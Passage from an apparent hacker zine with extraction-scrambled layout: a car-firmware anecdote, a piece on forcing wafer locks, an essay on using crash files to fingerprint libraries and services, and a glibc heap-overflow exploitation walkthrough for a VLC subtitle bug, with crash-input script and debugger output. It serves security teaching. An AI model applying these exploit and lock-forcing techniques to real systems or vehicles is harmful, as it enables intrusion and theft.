2001 Pontiac Trans Am, I can emulate my own
firmware image and send the same request to it.
Once I see where the code takes me, I can mod-
ify the byte appropriately, recalculate the firmware
checksum, reflash the chip in my programmer, resol-
der it back into the PCM, reassemble it and reattach
it to the car, hop in, and turn the key and hope for
the best.
I’m sorry to say that this doesn’t work.
Why? Who can say for sure? There are several
possibilities. The most plausible explanation is that
I just screwed up the soldering. A flash chip’s pins
can only take so much abuse, especially when I’m
the one holding the iron.
Or, since I discovered that this anti-theft sta-
tus is returned via a non-standard OBD2 request,
it’s possible that the request might just do some-
thing different between the two firmware images. It
doesn’t bode well that the two images were so dif-
ferent that I couldn’t find any code patterns across
both of them. My Cavalier came out in 1997 when
OBD2 was brand new, so it’s entirely possible that
the firmware is older than when GM thought to even
return this anti-theft status over OBD2.
What do I do now? I finally decide to give up
and buy a new car. But if I could do it over again,
I would spend more time figuring out exactly how
to flash a firmware image through the OBD2 port.
With that, I would’ve been free to experiment and
try over and over again until I was sure I got it right.
When I have to repeatedly desolder and resolder the
flash chip several times for each attempt, the poten-
tial for catastrophe is very high.
If you take anything away from this story, I hope
it’s this: if you’re faced with a problem, and you
come up with a really crazy idea, don’t be afraid to
try it. You might be surprised, it just might work,
and you just might get something out of it. The car
may still be sitting in a garage collecting dust, but I
did manage to get a functioning car computer emu-
lator out of it. My faithful companion did not die in
vain. And who knows, maybe someday he will live
again.
1616:04
Bars of Brass or Wafer Thin Security?
by Deviant Ollam
Many of you may already be familiar with the in-
ternals of conventional pin tumbler locks. My as-
sociates and I in TOOOL have taught countless
hackers the art of lockpicking at conferences, hack-
erspaces, and bars over the years. You may have
seen animations and photographs which depict the
internal components — pins made of brass, nickel, or
steel — which prevent the lock’s plug from turning
unless they are all slid into the proper position with
a key or pick tools.
Pin tumbler locks are often quite good at resist-
ing attempts to brute force them open. With five
or six pins of durable metal, each typically at least
.1” (3mm) in diameter, the force required to sim-
ply torque a plug hard enough to break all of them
is typically more than you can impart by inserting
a tool down the keyway. The fact that brands of
pin tumbler locks have relatively tight, narrow key-
ways increases the difficulty of fabricating a tool that
could feasibly impart enough force without breaking
itself.
However, since the 1960’s, pin tumbler locks have
become increasingly rare on automobiles, replaced
with wafer locks. There are reasons for this, such as
ease of installation and the convenience of double-
sided keys, but wafer locks lack a pin tumbler lock’s
resistance to brute force turning attacks.
wafers into the middle of the plug, allowing it to
turn.
However, consider the differences between the
pins of a pin tumbler lock and the wafers of a wafer
lock. While pin tumblers are often .1” (3mm) or
more in thickness, wafers are seldom more than .02”
or .03” (well below 1mm) and are often manufac-
tured totally out of brass.
This thin cross-section, coupled with the wide
and featureless keyways in many automotive wafer
locks, makes forcing attacks much more feasible.
Given a robust tool, it is possible to put the plug
of a wafer lock under significant torque, enough to
cause the tabs on the top and bottom of each wafer
to shear completely off, allowing the plug to turn.
Such an attack is seldom covert, as it often leaves
signs of damage on the exterior of the lock as well as
small broken bits within the plug or the lock hous-
ing.
Modern automotive locks attempt to mitigate
such attacks by using stronger materials, such as
stainless steel. An alternate strategy is to employ
strategic weaknesses so that the piece breaks in a
controlled way, chosen by the manufacturer to frus-
trate a car thief.
Electronic defenses are also used, such as the
known resistance described by Brandon Wilson on
page 7. Newer vehicles use magnetically coupled
transponders, sometimes doing away with a metal
key entirely.
Regardless of the type of lock mechanism or anti-
theft technology implemented by a given manufac-
turer, one should never assume that a vehicle’s ig-
nition has the same features or number of wafers as
the door locks, trunk lock, or other locks elsewhere
on the car.
As always, if you want to be certain, take some-
thing apart and see the insides for yourself!
The diagram above shows the plug (light gray)
seated within the housing sleeve (dark gray) as in a
typical installation.
Running through the plug of a wafer lock are
wafers, thin plates of metal typically manufactured
from brass. These are biased in a given direction
by means of spring pressure; in automotive locks, it
is typical to see alternating wafers biased up, down,
up, down, and so on as you look deeper into the
lock. The wafers have tabs, small protrusions of
metal which stick out from the plug when the lock
is at rest. The tabs protrude into spline channels in
the housing sleeve, preventing the plug from turn-
ing. The bitting of a user’s key rides through holes
punched within these wafers and helps to “pull” the
1716:05
Fast Cash for Useless Bugs!
by EA
Hello neighbors,
I come to you with a short story about useless
crashes turned useful.
Every one of us who has ever looked at a piece of
code looking for vulnerabilities has ended up finding
a number of situations which are more than sim-
ple bugs but just a bit too benign to be called a
vulnerability. You know, those bugs that lead to
process crashes locally, but can’t be exploited for
anything else, and don’t bring a remote server down
long enough to be called a Denial Of Service.
They come in various shapes and sizes from sim-
ple assert()s being triggered in debug builds only,
to null pointer dereferences (on certain platforms),
to recursive stack overflows and many others. Some
may be theoretically exploitable on obscure plat-
form where conditions are just right. I’m not talk-
ing about those here, those require different treat-
ment. 12
The ones I’m talking about are the ones we are
dead sure can’t be abused and by that virtue might
have quite a long life. I’m talking about all those
hundreds of thousands of null pointer dereferences
in MS Office that plagued anybody who dared fuzz
it, about unbounded recursions in PDF renderers,
and infinite loops in JavaScript engines. Are they
completely useless or can we squeeze just a tiny bit
of purpose from their existence?
As I advise everybody should, I’ve been keep-
ing these around, neatly sorting them by target and
keeping track of which ones died. I wouldn’t say I’ve
been stockpiling them, but it would be a waste to
just throw them away, wouldn’t it?
Anyway, here are some of my uses for these use-
less crashes – including a couple of examples, all
dealing with file formats, but you can obviously gen-
eralize.
Testing Debug/Fuzzing Harness The first use
I came up with for long lived, useless crashes in
popular targets is testing debugging or fuzzing har-
nesses. Say I wrote a new piece of code that is sup-
posed to catch crashes in Flash that runs in the con-
text of a browser. How can I be sure my tool actu-
ally catches crashes if I don’t have a proper crashing
testcase to test it with?
Of course CDB catches this, but would your cus-
tom harness? It’s simple enough to test. From
a standpoint of a debugger, crashing due to null
pointer dereference or heap overflow is the same.
It’s all an “Access Violation” until you look more
closely – and it’s always better to test on the actual
thing than on a synthetic example.
# cdb f l a s h p l a y e r _ 2 6 _ s a . e x e f l a s h _ c r a s h e r . s w f
2 CommandLine : f l a s h p l a y e r _ 2 6 _ s a . e x e f l a s h _ c r a s h e r . s w f
( 7 8 4 . f 3 c ) : Break i n s t r u c t i o n e x c e p t i o n − code 80000003 ( f i r s t ch an ce )
4 eax =00000000 ebx =00000000 e c x =001 e f 4 1 8 edx=777 f 6 c 7 4 e s i= f f f f f f f e e d i =00000000
e i p =778505 d9 e s p =001 e f 4 3 4 ebp=001 e f 4 6 0 i o p l =0
nv up e i p l z r na pe nc
6 c s =001b s s =0023 ds =0023 e s =0023 f s =003b g s =0000
e f l =00000246
n t d l l ! LdrpDoDebuggerBreak+0x2c :
8 778505 d9 c c
int
3
0:000 > g
10 ( 7 8 4 . f 3 c ) : A c c e s s v i o l a t i o n − code c 0 0 0 0 0 0 5 ( f i r s t ch an ce )
F i r s t ch an ce e x c e p t i o n s a r e r e p o r t e d b e f o r e any e x c e p t i o n h a n d l i n g .
12 This e x c e p t i o n may be e x p e c t e d and h a n d l e d .
∗∗∗ ERROR: Symbol f i l e not found .
D e f a u l t e d t o e x p o r t symbols f o r F l a s h P l a y e r . e x e −
14 eax=00 f 6 c 3 d 0 ebx =00000000 e c x =00000000 edx =0372 b17d e s i =00000000 e d i =02d1b020
e i p =0187 b6c9 e s p =001 eb490 ebp=00 f 6 c 3 d 0 i o p l =0
nv up e i p l nz na po nc
16 c s =001b s s =0023 ds =0023 e s =0023 f s =003b g s =0000
e f l =00010202
F l a s h P l a y e r ! IAEModule_IAEKernel_UnloadModule+0x25a559 :
18 0187 b6c9 8 b11
mov
edx , dword p t r [ e c x ]
ds : 0 0 2 3 : 0 0 0 0 0 0 0 0 = ? ? ? ? ? ? ? ?
0:000 >
12 The author has generously donated a collection of useless bugs. unzip pocorgtfo16.pdf useless_crashers.zip and then
extract that archive with a password of “pocorgtfo”.
18Test for Library Inclusion Ok, what else can
we do? Another instance of use for useless crashes
that I’ve found is in identifying if certain library is
embedded in some binary you don’t have source or
symbols for. Say an application renders TIFF im-
ages, and you suspect it might be using libtiff and
be in OSS license violation as it’s license file never
mentions it. Try to open a useless libtiff crash in it,
if it crashes chances are it does indeed use libtiff.
A more interesting example might be some piece
of code for PDF rendering. There are many many
closed and open source PDF SDKs out there, what
are the chances that the binary you are looking at
employs it’s own custom PDF parser as opposed to
Poppler, MuPDF, PDFium or Foxit SDKs?
Leadtools, for example, is an imaging SDK that
supports indexing PDF documents. Let’s test it:
The test crash for Foxit doesn’t seem to crash it,
instead it just spits out an error. Let’s try another
one:
1 $ . / t e s t i n g /LEADTOOLS19/ Bin / Lib / x64 / l f c \
. / mupdf_crasher / . / junk / −m a
3 l f c : draw−path . c : 5 2 0 : f z _ a d d _ l i n e _ j o i n :
A s s e r t " I n v a l i d l i n e j o i n "==0 f a i l e d .
5 Aborted ( c o r e dumped )
$
Would you look at that; it’s an assertion failure
so we get a bit of code path, too! Doing a simple
lookup confirms that this code indeed comes from
MuPDF which Leadtools embeds.
As another example, there is a tool called
PSPDFKit 13 which is more complete PDF manipu-
lation SDK (as opposed to PDFKit) for macOS and
iOS. Do they rely on PDFKit at all or on something
completely different? Let’s try with their demo ap-
plication.
1 $ . / t e s t i n g /LEADTOOLS19/ Bin / Lib / x64 / l f c \
. / f o x i t _ c r a s h e r / . / junk / −m a
3 E r r o r −9 g e t t i n g f i l e i n f o r m a t i o n from
. / f o x i t _ c r a s h e r /8 c . . . d 1 7 4 b 1 f 1 8 9 . p d f
5 $
( l l d b ) t a r g e t c r e a t e "PSPDFCatalog"
2 C u r r e n t e x e c u t a b l e s e t t o ’ PSPDFCatalog ’ .
( l l d b ) r p d f k i t _ c r a s h e r . pdf
4 P r o c e s s 53349 l a u n c h e d : ’ PSPDFCatalog ’
P r o c e s s 53349 e x i t e d with s t a t u s = 0
6 ( lldb )
Nothing out of the ordinary, so let’s try another
test.
( l l d b ) r pdfium_crasher . pdf
2 P r o c e s s 53740 l a u n c h e d : ’ PSPDFCatalog−macOS ’
P r o c e s s 53740 s t o p p e d
4 ∗ t h r e a d #2: t i d = 0 x 2 0 6 0 f c , . . .
s t o p r e a s o n = EXC_BAD_ACCESS
6 ( code =2 , a d d r e s s =0x 7 0 0 0 0 9 a 7 6 f c 8 )
libsystem_malloc . dylib ‘
8
szone_malloc_should_clear :
−>0x 7 f f f 9 7 3 7 9 4 6 d +395: c a l l q 0 x 7 f f f 9 7 3 7 a 7 7 0
10
; tiny_malloc_from_free_list
0 x 7 f f f 9 7 3 7 9 4 7 2 <+400>: movq
%rax , %r 9
12
0 x 7 f f f 9 7 3 7 9 4 7 5 <+403>: t e s t q %r9 , %r 9
0 x 7 f f f 9 7 3 7 9 4 7 8 <+406>: movq
%r12 , %rbx
Now ain’t that neat! It seems like PSPDFKit
actually uses PDFium under the hood. Now we can
proceed to dig into the code a bit and actually con-
firm this (in this case their license also confirms this
conclusion).
13 Version
2017-08-23 23-34-32 shown here.
19What else could we possibly use crashes like
these for? These could also be useful to construct
a sort of oracle when we are completely blind as to
what piece of code is actually running on the other
side. And indeed, some folks have used this before
when attacking different online services, not unlike
Chris Evans’ excellent writeup. 14 What would hap-
pen if you try to preview above mentioned PDFs
in Google Docs, Dropbox, Owncloud, or any other
shiny web application? Could you tell what those
are running? Well that could be useful, couldn’t it?
I wouldn’t call these tests conclusive, but it’s a good
start.
I’ll finish this off with a simple observation. No
one seems to care about crashes due to infinite re-
cursion and those tend to live longest, followed of
course by null pointer dereferences, so one of either
of those is sure to serve you for quite some time.
At least that has been the case in my very humble
experience.
14 Black
Box Discovery of Memory, Scary Beast Security blog, March 2017.
2016:06
The Adventure of the Fragmented Chunks
by Yannay Livneh
In a world of chaos, where anti-exploitation tech-
niques are implemented everywhere from the bot-
toms of hardware (Intel CET) to the heavens of
cloud-based network inspection products, one place
remains unmolested, pure and welcoming to ex-
ploitation: the GNU C Standard Library. Glibc, at
least with its build configuration on popular plat-
forms, has a consistent, documented record of not
fully applying mitigation techniques.
The glibc on a modern Ubuntu does not have
stack cookies, heap cookies, or safe versions of string
functions, not to mention CFG. It’s like we’re back
in the good ol’ nineties (I couldn’t even spell my
own name back then, but I was told it was fun).
So no wonder it’s heaven for exploitation proof of
concepts and CTF pwn challenges. Sure, users of
these platforms are more susceptible to exploitation
once a vulnerability is found, but that’s a small sac-
rifice to make for the infinitesimal improvement in
performance and ease of compiled code readability.
This sermon focuses on the glibc heap implemen-
tation and heap-based buffer overflows. Glibc heap
is based on ptmalloc (which is based on dlmalloc)
and uses an inline-metadata approach. It means
the bookkeeping information of the heap is saved
within the chunks used for user data. For an of-
ficial overview of glibc malloc implementation, see
the Malloc Internals page of the project’s wiki. This
approach means sensitive metadata, specifically the
chunk’s size, is prone to overflow from user input.
In recent years, many have taken advantage of
this behavior such as Google’s Project Zero’s 2014
version of the poisoned NULL byte and The For-
gotten Chunks. 15 This sermon takes another step in
this direction and demonstrates how this implemen-
tation can be used to overcome different limitations
in exploiting real-world vulnerabilities.
Introduction to Heap-Based Buffer
Overflows
In the recent few weeks, as a part of our drive-by
attack research at Check Point, I’ve been fiddling
with the glibc heap, working with a very common
example of a heap-based buffer overflow. The vul-
nerability (CVE-2017-8311) is a real classic, taken
straight out of a textbook. It enables an attacker
to copy any character except NULL and line break
to a heap allocated memory without respecting the
size of the destination buffer.
Here is a trivial example. Assume a sequential
heap based buffer overflow.
1 // A l l o c a t e l e n g t h u n t i l NULL
char ∗ d s t = m a l l o c ( s t r l e n ( s r c ) + 1 ) ;
3 // copy u n t i l EOL
while ( ∗ s r c != ’ \n ’ )
5
∗ d s t++ = ∗ s r c ++;
∗ d s t = ’ \0 ’ ;
What happens here is quite simple: the dst
pointer points to a buffer allocated with a size large
enough to hold the src string until a NULL char-
acter. Then, the input is copied one byte at a time
from the src buffer to the allocated buffer until a
newline character is encountered, which may be well
after a NULL character. In other words, a straight-
forward overflow.
Put this code in a function, add a small main,
compile the program and run it under valgrind.
python −c " p r i n t ’A’ ∗ 23 + ’ \ 0 ’ " \
| v a l g r i n d . / a . out
15 GLibC
Adventures: The Forgotten Chunks, François Goichon, unzip pocorgtfo16.pdf forgottenchunks.pdf
21input
“AAA. . .AA\0”
. . . “\n”
heap
allocated
chunk
going to be
overridden
1 typedef struct {
char ∗name ;
3
u i n t 6 4 _ t dummy ;
void ( ∗ d e s t r u c t o r ) ( void ∗ ) ;
5 } victim_t ;
It outputs the following lines:
A linear overflow into this struct inevitably
overrides the name field before overwriting the
destructor field. The destructor field has to be
overwritten to gain control over the program. How-
ever, if the name field is dereferenced before invoking
the destructor, the whole thing just crashes.
==31714== I n v a l i d w r i t e o f s i z e 1
a t 0 x40064C : f o r m a t ( main . c : 1 3 )
by 0 x40068E : main ( main . c : 2 2 )
Address 0 x52050d8 i s 0 b y t e s a f t e r a b l o c k
o f s i z e 24 a l l o c ’ d
a t 0x4C2DB8F : m a l l o c
( i n vgpreload_memcheck−amd64−l i n u x . s o )
by 0 x400619 : f o r m a t ( main . c : 9 )
by 0 x40068E : main ( main . c : 2 2 )
malicious overflow payload
overflowing
buffer
So far, nothing new. But what is the common
scenario for such vulnerabilities to occur? Usually,
string manipulation from user input. The most
prominent example of this scenario is text parsing.
Usually, there is a loop iterating over a textual in-
put and trying to parse it. This means the user
has quite good control over the size of allocations
(though relatively small) and the sequence of allo-
cation and free operations. Completing an exploit
from this point usually has the same form:
name
destructor
“some name” foo_destructor()
GLibC Heap Internals in a Nutshell
To understand how to overcome this problem, recall
the internals of the heap implementation. The heap
allocates and manages memory in chunks. When a
chunk is allocated, it has a header with a size of
sizeof(size_t). This header contains the size of
the chunk (including the header) and some flags. As
all chunk sizes are rounded to multiples of eight, the
three least significant bits in the header are used as
flags. For now, the only flag which matters is the
in_use flag, which is set to 1 when the chunk is
allocated, and is otherwise 0.
So a sequence of chunks in memory looks like
the following, where data may be user’s data if the
chunk is allocated or heap metadata if the chunk is
freed. The key takeaway here is that a linear over-
flow may change the size of the following chunk.
1. Find an interesting struct allocated on the
heap (victim object).
2. Shape the heap in a way that leaves a hole
right before this victim object.
3. Allocate a memory chunk in that hole.
4. Overflow the data written to the chunk into
the victim object.
5. Profit.
allocated chunks
What’s the Problem?
size | data size | data size | metadata size | data
Sounds simple? Good. This is just the beginning.
In my exploit, I encountered a really annoying prob-
lem: all the interesting structures that can be used
as victims had a pointer as their first field. That
first field was of no interest to me in any way, but
it had to be a valid pointer for my exploit to work.
I couldn’t write NULL bytes, but had to write se-
quentially in the allocated buffer until I reached the
interesting field, a function pointer.
For example, consider the following struct:
free chunk
The heap stores freed chunks in bins of various
types. For the purpose of this article, it is sufficient
to know about two types of bins: fastbins and nor-
mal bins (all the other bins). When a chunk of small
size (by default, smaller than 0x80 bytes, including
the header) is freed, it is added to the correspond-
ing fastbin and the heap doesn’t coalesce it with
22the adjacent chunks until a further event triggers
the coalescing behavior. A chunk that is stored in
a fastbin always has its in_use bit set to 1. The
chunks in the fastbin are served in LIFO manner,
i.e., the last freed chunk will be allocated first when
a memory request of the appropriate size is issued.
When a normal chunk (not small) is freed, the heap
checks whether the adjacent chunks are freed (the
in_use bit is off), and if so, coalesces them before
inserting them in the appropriate bin. The key take-
away here is that small chunks can be used to keep
the heap fragmented.
The small chunks are kept in fastbins until
some events that require heap consolidation occur.
The most common event of this kind is coalescing
with the top chunk. The top chunk is a special
chunk that is never allocated. It is the chunk in the
end of the memory region assigned to the heap. If
there are no freed chunks to serve an allocation, the
heap splits this chunk to serve it. To keep the heap
fragmented using small chunks, you must avoid heap
consolidation events.
For further reading on glibc heap implementa-
tion details, I highly recommend the Malloc Inter-
nals page of the project wiki. It is concise and very
well written.
Hole
size |
victim
field
3. Allocate chunk0 right before the victim object.
4. Allocate chunk1 right before chunk0.
chunk1
chunk0
victim_object
size | size | size |
(S 1 ) (S 0 ) (SV )
victim
field
5. Overflow chunk1 into the metadata of
chunk0, making chunk0’s size equal to
sizeof(chunk0) + sizeof(victim_object):
S 0 = S 0 + S V .
6. Free chunk0.
S 1 |
S 0 + S V |
overflow
S V |
victim
field
synthetically enlarged
chunk0
7. Allocate
chunk
with
size
=
S 0 +
offsetof(victim_object, victim_field).
8. Allocate chunk with size = S V −
offsetof(victim_object, victim_field).
S 1 |
Overcoming the Limitations
S 0 + δ |
S V − δ |
victim
field
δ
(victim field offset)
So back to the problem: how can this kind of linear-
overflow be leveraged to writing further up the heap
without corrupting some important data in the mid-
dle?
My nifty solution to this problem is something
I call “fragment-and-write.” (Many thanks to Omer
Gull for his help.) I used the overflow to syntheti-
cally change the size of a freed chunk, tricking the al-
locator to consider the freed chunk as bigger than it
actually is, i.e., overlapping the victim object. Next,
I allocated a chunk whose size equals the original
freed chunk size plus the fields I want to skip, with-
out writing it. Finally, I allocated a chunk whose
size equals the victim object’s size minus the off-
set of the skipped fields. This last allocation falls
exactly on the field I want to overwrite.
Workflow to exploit such a scenario:
9. Write the data in the chunk allocated in
stage 8. It will directly write to the victim
field.
10. Profit.
Note that the allocator overrides some of the
user’s data with metadata on de-allocation, depend-
ing on the bin. (See glibc’s implementation for de-
tails.) Also, the allocator verifies that the sizes of
the chunks are aligned to multiples of 16 on 64-bit
platforms. These limitations have to be taken into
account when choosing the fields and using tech-
nique.
1. Find an interesting struct allocated on the
heap (victim object).
2. Shape the heap in a way that leaves a hole
right before this object.
23Real World Vulnerability
438 default :
439
i f ( ! p_sys−>j s s . i_comment )
440
{
441
∗ psz_text2 = ∗ psz_text ;
442
p s z _ t e x t 2++;
443
}
444 }
Enough with theory! It’s time to exploit some real-
world code.
VLC 2.2.2 has a vulnerability in the subtitles
parsing mechanism – CVE-2017-8311. I synthesized
a small program which contains the original vulner-
able code and flow from VLC 2.2.2 wrapped in a
small main function and a few complementary ones,
see page 29 for the full source code. The original
code parses the JacoSub subtitles file to VLC’s in-
ternal subtitle_t struct. The TextLoad function
loads all the lines of the input stream (in this case,
standard input) to memory and the ParseJSS func-
tion parses each line and saves it to subtitle_t
struct. The vulnerability occurs in line 418:
This will copy the data outside the source buffer
into psz_text2, possibly overflowing the destination
buffer.
To reach the vulnerable code, the input must be
a valid line of JacoSub subtitle, conforming to the
pattern scanned in line 256:
256
373 p s z _ o r i g 2=c a l l o c ( s t r l e n ( p s z _ t e x t ) +1 ,1) ;
374 p s z _ t e x t 2=p s z _ o r i g 2 ;
375
376 f o r ( ; ∗ p s z _ t e x t != ’ \0 ’
&& ∗ p s z _ t e x t != ’ \n ’
&& ∗ p s z _ t e x t != ’ \ r ’ ; )
377 {
378
switch ( ∗ p s z _ t e x t )
379
{
...
407
case ’ \\ ’ :
...
415
i f ( ( t o u p p e r ( ( u i n t 8 _ t ) ∗ ( p s z _ t e x t +1) )
== ’C ’ ) | |
416
( t o u p p e r ( ( u i n t 8 _ t ) ∗ ( p s z _ t e x t +1) )
== ’F ’ ) )
417
{
418
p s z _ t e x t++; p s z _ t e x t++;
419
break ;
420
}
...
445
p s z _ t e x t++;
446 }
else i f ( sscanf ( s ,
"@%d @%d %[^\n\ r ] " ,
&f 1 , &f 2 , p s z _ t e x t ) == 3 )
When triggering the vulnerability under valgrind
this is what happens:
python −c " p r i n t ’@0@0\\ c ’ " \
| v a l g r i n d . / pwnme
==32606== C o n d i t i o n a l jump o r move depends
on u n i n i t i a l i s e d v a l u e ( s )
a t 0 x4016E2 : ParseJSS (pwnme . c : 3 7 6 )
by 0 x40190F : main (pwnme . c : 4 9 9 )
This output indicates that the condition in the
for-loop depends on the uninitialized value, data
outside the allocated buffer. Perfect!
The psz_text points to a user-controlled buffer
on the heap containing the current line to parse. In
line 373, a new chunk is allocated with a size large
enough to hold the data pointed at by psz_text.
Then, it iterates over the psz_text pointed data. If
the byte one before the last in the buffer is ‘\’ (back-
slash) and the last one is ‘c’, the psz_text pointer
is incremented by 2 (line 418), thus pointing to the
null terminator. Next, in line 445, it is incremented
again, and now it points outside the original buffer.
Therefore, the loop may continue, depending on the
data that resides outside the buffer.
An attacker may design the data outside the
buffer to cause the code to reach line 441 within
the same loop.
24Sharpening the Primitive
data after the timing prefix to the allocated chunk.
If no option matches, the chunk is freed.
Recalling glibc allocator behavior, the invocation
of malloc with size of the most recently freed chunk
returns the most recently freed chunk to the caller.
This means that if an input line starts with a pound
sign (‘#’) and the next line has the same length, the
second allocation will be in the same place and hold
the data from the previous iteration.
This is the way to put data in the source chunk.
The next step is not to override it with the second
line’s data. This can be easily achieved using the
sscanf and adding leading zeros to the timing for-
mat at the beginning of the line. The sscanf in line
256 writes only the data after the timing format.
By providing sscanf arbitrarily long string of digits
as input, it writes very little data to the allocated
buffer.
With these capabilities, here is the first crashing
example:
After having a good understanding of how to trigger
the vulnerability, it’s time to improve the primitives
and gain control over the environment. The goal is
to control the data copied after triggering the vul-
nerability, which means putting data in the source
chunk.
The allocation of the source chunk occurs in line
238:
232 f o r ( ; ; )
233 {
234
const char ∗ s = TextGetLine ( t x t ) ;
...
238
psz_orig = malloc ( s t r l e n ( s ) + 1 ) ;
...
241
psz_text = psz_orig ;
242
243
/∗ Complete time l i n e s ∗/
244
i f ( s s c a n f ( s , "%d:%d:%d.%d "
"%d:%d:%d.%d %[^\n\ r ] " ,
245
&h1 ,&m1,& s1 ,& f 1 ,&h2 ,&m2,& s2 ,& f 2 ,
p s z _ t e x t ) ==9)
246
{
...
253
break ;
254
}
255
/∗ S h o r t time l i n e s ∗/
256
e l s e i f ( s s c a n f ( s , "@%d @%d %[^\n\ r ] " ,
&f 1 , &f 2 , p s z _ t e x t ) == 3 )
257
{
...
262
break ;
263
}
...
266
e l s e i f ( s [ 0 ] == ’# ’ )
267
{
...
272
s t r c p y ( psz_text , s ) ;
...
319
f r e e ( psz_orig ) ;
320
continue ;
321
}
322
else
323 /∗ Unknown t y p e , p r o b a b l y a comment . ∗/
324
{
325
f r e e ( psz_orig ) ;
326
continue ;
327
}
328 } $ python c r a s h . py > i n p u t
$ gdb −q . / pwnme
Reading symbols from . / pwnme . . . done .
( gdb ) r < i n p u t
S t a r t i n g program : /pwnme < i n p u t
s t a r t i n g to read user input
>
Program r e c e i v e d s i g n a l SIGSEGV ,
Segmentation f a u l t .
0 x 0 0 0 0 0 0 0 0 0 0 4 0 0 d f 1 i n ParseJSS ( p_demux=0
x6030c0 , p _ s u b t i t l e =0x605798 , i _ i d x =1)
a t pwnme . c : 2 2 2
222
i f ( ! p_sys−>j s s . b _ i n i t e d )
( gdb ) hexdump &p_sys 8
0 0 0 0 0 0 0 0 : 23 23 23 23 23 23 23 23 ########
The code fetches the next input line (which may
contain NULLs) and allocates enough data to hold
NULL-terminated string. (Line 238.) Then it tries
to match the line with JacoSub valid format pat-
terns. If the line starts with a pound sign (‘#’), the
line is copied into the chunk, freed, and the code
continues to the next input line. If the line matches
the JacoSub subtitle, the sscanf function writes the The input has overridden a pointer with con-
trolled data. The buffer overflow happens in the
psz_orig2 buffer, allocated by invoking calloc(
strlen( psz_text) + 1, 1 ) (line 373), which
translates to request an allocation big enough
to hold three bytes, “\\c\0”.
The minimum
size for a chunk is 2 * sizeof(void*) + 2 *
sizeof(size_t) which is 32. As the glibc allocator
import s y s
s y s . s t d o u t . w r i t e ( ’# ’ ∗ 0 xe7 + ’ \n ’ )
s y s . s t d o u t . w r i t e ( ’@0@ ’ + ’ 0 ’ ∗ 0 xe2 + ’ \\ c ’ )
Plugging the output of this Python script as the
input of the compiled program (from page 29) pro-
duces a nice segmentation fault. Open GDB, this is
what happens inside:
25uses a best-fit algorithm, the allocated chunk is the
smallest free chunk in the heap. In the main func-
tion, the code ensures such a chunk exists before the
interesting data:
Now the heap overflow primitive is well estab-
lished, and so is the constraint. Note that even
though the vulnerability is triggered in the last input
line, the ParseJSS function is invoked once again
and returns an error to indicate the end of input. On
every invocation it dereferences the p_sys pointer,
so this pointer must remain valid even after trigger-
ing the vulnerability.
467 void ∗ p l a c e h o l d e r =
m a l l o c ( 0 xb0 − s i z e o f ( s i z e _ t ) ) ;
468
469 demux_t ∗p_demux =
c a l l o c ( s i z e o f ( demux_t ) , 1 ) ;
...
477 f r e e ( p l a c e h o l d e r ) ;
Exploitation
Now it’s time to employ the technique outlined ear-
lier and overwrite only a specific field in a target
struct. Look at the definition of demux_t struct:
The placeholder is allocated first, and after
that an interesting object: p_demux. Then, the
placeholder is freed, leaving a nice hole before
p_demux. The allocation of psz_orig2 catches this
chunk and the overflow overrides p_demux (located
in the following chunk) with input data. The p_sys
pointer that causes the crash is the first field of
demux_t struct. (Of course, in a real world scenario
like VLC the attacker needs to shape the heap to
have a nice hole like this, a technique called Feng-
Shui, but that is another story for another time.)
99 typedef struct {
100
demux_sys_t ∗ p_sys ;
101
stream_t ∗ s ;
102
char padding [ 6 ∗ s i z e o f ( s i z e _ t ) ] ;
103
void ( ∗pwnme) ( void ) ;
104
char moar_padding [ 2 ∗ s i z e o f ( s i z e _ t ) ] ;
105 } demux_t ;
The end goal of the exploit is to control the
pwnme function pointer in this struct. This pointer
is initialized in main to point to the not_pwned
function. To demonstrate an arbitrary control over
this pointer, the POC exploit points it to the
totally_pwned function. To bypass ASLR, the ex-
ploit partially overwrites the least significant bytes
of pwnme, assuming the two functions reside in rela-
tively close addresses.
454 s t a t i c void not_pwned ( void ) {
455
p r i n t f ( " e v e r y t h i n g went down w e l l \n" ) ;
456 }
457
458 s t a t i c void t o t a l l y _ p w n e d ( void )
__attribute__ ( ( unused ) ) ;
459 s t a t i c void t o t a l l y _ p w n e d ( void ) {
460
p r i n t f ( "OMG, t o t a l l y _ p w n e d ! \ n" ) ;
461 }
462
463 i n t main ( void ) {
...
476
p_demux−>pwnme = not_pwned ;
There are a few ways to write this field:
• Allocate it within psz_orig and use the
strcpy or sscanf. However, this will also
write a terminating NULL which imposes a
hard constraint on the addresses that may be
pointed to.
26• Allocate it within psz_orig2 and write it in
the copy loop. However, as this allocation uses
calloc, it will zero the data before copying to
it, which means the whole pointer (not only
the LSB) should be overwritten.
7. Write a JSS line whose psz_orig makes an al-
location of size 0x100 and the psz_orig2 size
makes an allocation of size 0x20. Trigger the
vulnerability and write the LSB of the pwnme
field to be the LSB of totally_pwned func-
tion.
• Allocate psz_orig2 chunk before the field and
overflow into it. Note partial overwrite is pos-
sible by padding the source with the ‘}’ charac-
ter. When reading this character in the copy-
ing loop, the source pointer is incremented but
no write is done to the destination, effectively
stopping the copy loop.
8. Profit.
There are only two things missing here. First,
when loading the file in TextLoad, you must be care-
ful not to catch the hole. This can be easily done by
making sure all lines are of size 0x100. Note that
this doesn’t interfere with other constructs because
it’s possible to put NULL bytes in the lines and then
add random padding to reach the allocation size of
0x100. Second, you must not trigger heap consol-
idation, which means not to coalesce with the top
chunk. So the first line is going to be a JSS line with
psz_orig and psz_orig2 allocations of size 0x100.
As they are allocated sequentially, the second allo-
cation will fall between the first and top, effectively
preventing coalescing with it.
This is the way forward! So here is the current game
plan:
1. Allocate a chunk with a size of 0x50 and free
it. As it’s smaller than the hole of the place-
holder (size 0xb0), it will break the hole into
two chunks with sizes of 0x50 and 0x60. Free-
ing it will return the smaller chunk to the al-
locator’s fastbins, and won’t coalesce it, which
leaves a 0x60 hole.
2. Allocate a chunk with a size of 0x60, fill it
with the data to overwrite with and free it.
This chunk will be allocated right before the
p_demux object. When freed, it will also be
pushed into the corresponding fastbin.
3. Write a JSS line whose psz_orig makes an al-
location of size 0x60 and the psz_orig2 size
makes an allocation of size 0x50. Trigger the
vulnerability and write the LSB of the size of
psz_orig chunk as 0xc1: the size of the two
chunks with the prev_inuse bit turned on.
Free the psz_orig chunk.
4. Allocate a chunk with a size of 0x70 and free
it. This chunk is also pushed to the fastbins
and not coalesced. This leaves a hole of size
0x50 in the heap.
5. Allocate without writing chunks with a size of
0x20 (the padding of the p_demux object) and
size of 0x30 (this one contains the pwnme field
until the end of the struct). Free both. Both
are pushed to fastbin and not coalesced.
6. Make an allocation with a size of 0x100 (arbi-
trary, big), fill it with data to overwrite with
and free it.
